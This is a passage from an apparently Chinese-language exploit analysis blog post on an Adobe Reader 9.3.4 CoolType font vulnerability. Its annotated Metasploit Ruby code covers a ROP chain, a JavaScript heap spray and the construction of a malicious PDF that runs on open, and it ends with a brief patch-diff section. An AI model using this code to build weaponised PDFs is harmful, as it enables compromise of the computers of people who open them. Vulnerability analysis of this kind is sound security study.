class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetLow</span></span><br><span class="line">        <span class="number">0x00010000</span>,   <span class="comment"># dwNumberOfBytesToMap</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes ecx - writable pointer</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret - save map base addr</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000030</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes eax - saved file mapping ptr</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a7d8</span>,   <span class="comment"># mov eax,[eax] / ret - load saved mapping ptr</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000020</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80aedc</span>,   <span class="comment"># lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x00000034</span>,   <span class="comment"># becomes eax</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80d585</span>,   <span class="comment"># add eax,edx / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x0000000a</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a849170</span>,   <span class="comment"># becomes eax (import for memcpy)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call memcpy</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># becomes first arg to memcpy (dst)</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># becomes second arg to memcpy (src)</span></span><br><span class="line">        <span class="number">0x00001000</span>,   <span class="comment"># becomes third arg to memcpy (length)</span></span><br><span class="line">    ].pack(<span class="string">'V*'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用于混淆js的变量名</span></span><br><span class="line">    var_unescape  = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>) <span class="comment"># rand_text_alpha()用于生成随机的字符串，同时避免生成漏洞利用中的坏字符。</span></span><br><span class="line">    var_shellcode = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_start     = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_s         = <span class="number">0x10000</span></span><br><span class="line">    var_c         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_b         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_d         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_3         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_i         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_4         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    payload_buf = <span class="string">''</span></span><br><span class="line">    payload_buf &lt;&lt; stack_data           <span class="comment"># 将真正的shellcode复制到可读可写可执行内存段的ROP Chain。</span></span><br><span class="line">    payload_buf &lt;&lt; encoded_payload      <span class="comment"># 经过编码的shellcode放在ROP Chain的后面</span></span><br><span class="line"></span><br><span class="line">    escaped_payload = Rex::Text.to_unescape(payload_buf) <span class="comment"># 返回用于Javascript的unicode转义字符串</span></span><br><span class="line"></span><br><span class="line">    js = <span class="string">%Q|</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_unescape&#125;</span> = unescape;</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_shellcode&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( '<span class="subst">#&#123;escaped_payload&#125;</span>' );</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_c&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );</span></span><br><span class="line"><span class="string">while (<span class="subst">#&#123;var_c&#125;</span>.length + 20 + 8 &lt; <span class="subst">#&#123;var_s&#125;</span>) <span class="subst">#&#123;var_c&#125;</span>+=<span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> = <span class="subst">#&#123;var_c&#125;</span>.substring(0, (0x0c0c-0x24)/2);</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_shellcode&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_d&#125;</span> = <span class="subst">#&#123;var_b&#125;</span>.substring(0, <span class="subst">#&#123;var_s&#125;</span>/2);</span></span><br><span class="line"><span class="string">while(<span class="subst">#&#123;var_d&#125;</span>.length &lt; 0x80000) <span class="subst">#&#123;var_d&#125;</span> += <span class="subst">#&#123;var_d&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_3&#125;</span> = <span class="subst">#&#123;var_d&#125;</span>.substring(0, 0x80000 - (0x1020-0x08) / 2);</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_4&#125;</span> = new Array();</span></span><br><span class="line"><span class="string">for (<span class="subst">#&#123;var_i&#125;</span>=0;<span class="subst">#&#123;var_i&#125;</span>&lt;0x1f0;<span class="subst">#&#123;var_i&#125;</span>++) <span class="subst">#&#123;var_4&#125;</span>[<span class="subst">#&#123;var_i&#125;</span>]=<span class="subst">#&#123;var_3&#125;</span>+"s";</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"></span><br><span class="line">    js</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h4 id="4、make-pdf"><a href="#4、make-pdf" class="headerlink" title="4、make_pdf()"></a>4、make_pdf()</h4><p>&emsp;&emsp;此函数一步一步构造<code>pdf</code>中的每一个<code>obj</code>,将<code>ttf字体数据</code>和<code>javascript代码</code>分别放在了<code>obj10</code>和<code>obj12</code>,然后在<code>obj1</code>中设置<code>/OpenAction 11 0 R</code>,使pdf文件<code>打开</code>时,<code>javascript</code>能够被执行,从而实现<code>Heap Spary</code>。还构造了<code>obj13</code>,使<code>icucnv36.dll</code>能够被加载。因为,<code>exp</code>中使用的<code>ROPgadget</code>都是出自<code>icucnv36.dll</code>模块的,所以其必须要<code>被加载到内存</code>中。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pdf</span><span class="params">(ttf, js)</span></span></span><br><span class="line">    xref = []</span><br><span class="line">    eol = <span class="string">"\n"</span> <span class="comment"># end of line</span></span><br><span class="line">    endobj = <span class="string">"endobj"</span> &lt;&lt; eol</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Randomize PDF version?</span></span><br><span class="line">    pdf = <span class="string">"%PDF-1.5"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"%"</span> &lt;&lt; random_non_ascii_string(<span class="number">4</span>) &lt;&lt; eol     <span class="comment"># 四字节随机的非ASCII字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># catalog</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">1</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Pages "</span>) &lt;&lt; io_ref(<span class="number">2</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Catalog"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/OpenAction "</span>) &lt;&lt; io_ref(<span class="number">11</span>) &lt;&lt; eol</span><br><span class="line">    <span class="comment"># The AcroForm is required to get icucnv36.dll to load</span></span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/AcroForm "</span>) &lt;&lt; io_ref(<span class="number">13</span>) &lt;&lt; eol    <span class="comment"># /AcroForm是为了主程序能够加载icucnv36.dll</span></span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pages array</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">2</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/MediaBox "</span>) &lt;&lt; io_ref(<span class="number">3</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Resources "</span>) &lt;&lt; io_ref(<span class="number">4</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Kids ["</span>) &lt;&lt; io_ref(<span class="number">5</span>) &lt;&lt; <span class="string">"]"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Count 1"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Pages"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># media box</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">3</span>)</span><br><span class="line">    pdf &lt;&lt; <span class="string">"[0 0 595 842]"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># resources</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">4</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Font "</span>) &lt;&lt; io_ref(<span class="number">6</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># page 1</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">5</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Parent "</span>) &lt;&lt; io_ref(<span class="number">2</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/MediaBox "</span>) &lt;&lt; io_ref(<span class="number">3</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Resources "</span>) &lt;&lt; io_ref(<span class="number">4</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Contents ["</span>) &lt;&lt; io_ref(<span class="number">8</span>) &lt;&lt; n_obfu(<span class="string">"]"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Page"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol <span class="comment"># end obj dict</span></span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># font</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">6</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/F1 "</span>) &lt;&lt; io_ref(<span class="number">7</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ttf object</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">7</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Font"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Subtype /TrueType"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Name /F1"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/BaseFont /Cinema"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Widths []"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/FontDescriptor "</span>) &lt;&lt; io_ref(<span class="number">9</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Encoding /MacRomanEncoding"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># page content</span></span><br><span class="line">    content = <span class="string">"Hello World!"</span></span><br><span class="line">    content = <span class="string">""</span> +</span><br><span class="line">        <span class="string">"0 g"</span> + eol +</span><br><span class="line">        <span class="string">"BT"</span> + eol +</span><br><span class="line">        <span class="string">"/F1 32 Tf"</span> + eol +</span><br><span class="line">        <span class="string">"32 Tc"</span> + eol +</span><br><span class="line">        <span class="string">"1 0 0 1 32 773.872 Tm"</span> + eol +</span><br><span class="line">        <span class="string">"("</span> + content + <span class="string">") Tj"</span> + eol +</span><br><span class="line">        <span class="string">"ET"</span></span><br><span class="line"></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">8</span>) &lt;&lt; <span class="string">"&lt;&lt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Length %s"</span> % content.length) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; content &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># font descriptor</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">9</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type/FontDescriptor/FontName/Cinema"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Flags %d"</span> % (<span class="number">2</span>**<span class="number">2</span> + <span class="number">2</span>**<span class="number">6</span> + <span class="number">2</span>**<span class="number">17</span>))</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/FontBBox [-177 -269 1123 866]"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/FontFile2 "</span>) &lt;&lt; io_ref(<span class="number">10</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ttf stream</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    compressed = Zlib::Deflate.deflate(ttf) <span class="comment"># 字体数据是通过zlib进行压缩后放入pdf的</span></span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">10</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Length %s/Filter/FlateDecode/Length1 %s&gt;&gt;"</span> % [compressed.length, ttf.length]) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; compressed &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># js action</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">11</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type/Action/S/JavaScript/JS "</span>) + io_ref(<span class="number">12</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># js stream</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js)) <span class="comment"># javascript代码也是通过zlib进行压缩后放入pdf的</span></span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">12</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Length %s/Filter[/FlateDecode/ASCIIHexDecode]&gt;&gt;"</span> % compressed.length) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; compressed &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line">    <span class="comment"># The following form related data is required to get icucnv36.dll to load</span></span><br><span class="line">    <span class="comment"># 以下表单相关数据是为了让icucnv36.dll得到加载</span></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># form object</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">13</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/XFA "</span>) &lt;&lt; io_ref(<span class="number">14</span>) &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># form stream</span></span><br><span class="line">    xfa = <span class="string">&lt;&lt;-EOF</span></span><br><span class="line"><span class="string">    &lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">    &lt;xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"&gt;</span></span><br><span class="line"><span class="string">    &lt;config xmlns="http://www.xfa.org/schema/xci/2.6/"&gt;</span></span><br><span class="line"><span class="string">    &lt;present&gt;&lt;pdf&gt;&lt;interactive&gt;1&lt;/interactive&gt;&lt;/pdf&gt;&lt;/present&gt;</span></span><br><span class="line"><span class="string">    &lt;/config&gt;</span></span><br><span class="line"><span class="string">    &lt;template xmlns="http://www.xfa.org/schema/xfa-template/2.6/"&gt;</span></span><br><span class="line"><span class="string">    &lt;subform name="form1" layout="tb" locale="en_US"&gt;</span></span><br><span class="line"><span class="string">    &lt;pageSet&gt;&lt;/pageSet&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;&lt;/template&gt;&lt;/xdp:xdp&gt;</span></span><br><span class="line"><span class="string">    EOF</span></span><br><span class="line"></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">14</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Length %s&gt;&gt;"</span> % xfa.length) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; xfa &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line">    <span class="comment"># end form stuff for icucnv36.dll</span></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># trailing stuff</span></span><br><span class="line">    xrefPosition = pdf.length</span><br><span class="line">    pdf &lt;&lt; <span class="string">"xref"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"0 %d"</span> % (xref.length + <span class="number">1</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"0000000000 65535 f"</span> &lt;&lt; eol</span><br><span class="line">    xref.each <span class="keyword">do</span> <span class="params">|index|</span></span><br><span class="line">        pdf &lt;&lt; <span class="string">"%010d 00000 n"</span> % index &lt;&lt; eol</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    pdf &lt;&lt; <span class="string">"trailer"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Size %d/Root "</span> % (xref.length + <span class="number">1</span>)) &lt;&lt; io_ref(<span class="number">1</span>) &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line"></span><br><span class="line">    pdf &lt;&lt; <span class="string">"startxref"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; xrefPosition.to_s() &lt;&lt; eol</span><br><span class="line"></span><br><span class="line">    pdf &lt;&lt; <span class="string">"%%EOF"</span> &lt;&lt; eol</span><br><span class="line">    pdf</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><p>&emsp;&emsp;我下载了<code>Adobe Reader v9.4.0</code>版本,安装好后,提取出了其中的<code>CoolType.dll</code>模块。<code>Adobe Reader v9.3.4</code>中<code>CoolType.dll</code>的版本是<code>v5.5.72.1</code>,<code>Adobe Reader v9.4.0</code>中<code>CoolType.dll</code>的版本是<code>v5.5.73.1</code>。通过<code>BinDiff</code>进行对比后,结果如下：</p>
<div align="left"><img src="/resources/2018/2018-06-01-05.jpg" width="80%" height="70%" alt="BinDiff结果"></div>

